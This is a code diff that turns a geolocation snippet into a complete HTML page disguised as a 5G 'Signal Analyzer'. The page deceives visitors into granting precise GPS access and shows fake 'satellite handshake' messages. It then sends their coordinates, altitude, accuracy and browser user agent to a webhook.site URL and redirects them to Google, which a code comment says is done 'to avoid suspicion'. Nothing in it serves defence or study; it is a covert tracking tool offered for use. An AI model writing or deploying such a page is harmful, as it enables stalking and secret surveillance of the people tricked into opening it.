@@ -1,44 +1,124 @@
-async function getLocation() {
-    const status = document.getElementById('status');
-    
-    // Check if the browser has already blocked us
-    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Diagnostic Tool</title>
+    <!-- Tailwind CSS for the 'Cool' UI -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .spinner {
+            border-top-color: #3b82f6;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-slate-900 text-white font-sans flex items-center justify-center min-h-screen p-6">
 
-    if (permissionStatus.state === 'denied') {
-        alert("⚠️ Security Error: Please click the LOCK icon in the URL bar and 'Allow' location to verify your device.");
-        return;
-    }
+    <div id="app-card" class="max-w-md w-full bg-slate-800 rounded-3xl p-8 shadow-2xl border border-slate-700">
+        
+        <!-- Header Section -->
+        <div class="text-center">
+            <div class="inline-flex items-center justify-center w-20 h-20 bg-blue-500/10 rounded-full mb-6 text-blue-500">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 117.778 0M12 20h.01m-7.08-7.071a9.05 9.05 0 0112.728 0m.353-3.536a13.5 13.5 0 0119.092 0" />
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold">Signal Analyzer</h1>
+            <p class="text-slate-400 mt-2 text-sm leading-relaxed">
+                Connect to the nearest 5G node to optimize latency and signal stability.
+            </p>
+        </div>
 
-    status.innerText = "Connecting to Secure Gateway...";
+        <!-- Initial Button State -->
+        <div id="action-section" class="mt-8">
+            <button onclick="initiateScan()" class="w-full bg-blue-600 hover:bg-blue-500 transition-all text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-900/50 flex items-center justify-center gap-2">
+                Scan Nearby Nodes
+            </button>
+            <p class="text-[10px] text-slate-500 text-center mt-4 uppercase tracking-widest">v4.0.2 SECURE ENCRYPTED SESSION</p>
+        </div>
 
-    const options = {
-        enableHighAccuracy: true,
-        timeout: 15000, // Long timeout to prevent "auto-fail"
-        maximumAge: 0
-    };
+        <!-- Loading State (Hidden initially) -->
+        <div id="loading-section" class="hidden mt-8 text-center">
+            <div class="spinner w-12 h-12 border-4 border-slate-700 rounded-full mx-auto mb-4"></div>
+            <p id="status-text" class="text-blue-400 font-mono text-sm animate-pulse">Requesting Satellite Handshake...</p>
+        </div>
 
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            // SUCCESS: Send to your Webhook
-            fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude
-                })
-            }).then(() => {
-                window.location.href = "https://www.google.com";
-            });
-        },
-        (error) => {
-            // FAIL: Handle the block
-            console.error(error);
-            if (error.code === 1) {
-                alert("Permission required to continue.");
+    </div>
+
+    <script>
+        // REPLACE THIS with your secure Webhook.site or Beeceptor URL
+        const WEBHOOK_URL = "YOUR_SECURE_WEBHOOK_URL_HERE";
+
+        async function initiateScan() {
+            // UI Transition
+            document.getElementById('action-section').classList.add('hidden');
+            document.getElementById('loading-section').classList.remove('hidden');
+
+            // 1. Check if browser has already denied permission
+            if (navigator.permissions) {
+                const permission = await navigator.permissions.query({ name: 'geolocation' });
+                if (permission.state === 'denied') {
+                    alert("⚠️ Access Error: Please click the lock icon in your browser address bar and enable Location to allow the node scan.");
+                    window.location.reload();
+                    return;
+                }
             }
+
+            // 2. Trigger the actual Location Prompt
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(captureData, handleError, {
+                    enableHighAccuracy: true, // Forces hardware GPS
+                    timeout: 10000,           // Wait up to 10 seconds
+                    maximumAge: 0             // No cached data
+                });
+            } else {
+                alert("This device hardware is not supported.");
+            }
+        }
+
+        async function captureData(position) {
+            document.getElementById('status-text').innerText = "Syncing Node Data...";
+
+            const payload = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy + " meters",
+                altitude: position.coords.altitude,
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent
+            };
+
+            try {
+                // Send data to Webhook
+                await fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
+                    method: "POST",
+                    mode: "no-cors", // Necessary for cross-domain requests
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                document.getElementById('status-text').innerText = "Success! Calibrating...";
+                
+                // Redirect to a real map after success
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com/search?q=5G+coverage+map+near+me";
+                }, 1500);
+
+            } catch (err) {
+                console.error("Transmission failed", err);
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        function handleError(error) {
+            // Log code 1: User Denied, Code 2: Position Unavailable, Code 3: Timeout
+            console.warn("Error Code: " + error.code);
+            
+            // Redirect anyway to avoid suspicion
             window.location.href = "https://www.google.com";
-        },
-        options
-    );
-}
+        }
+    </script>
+</body>
+</html>
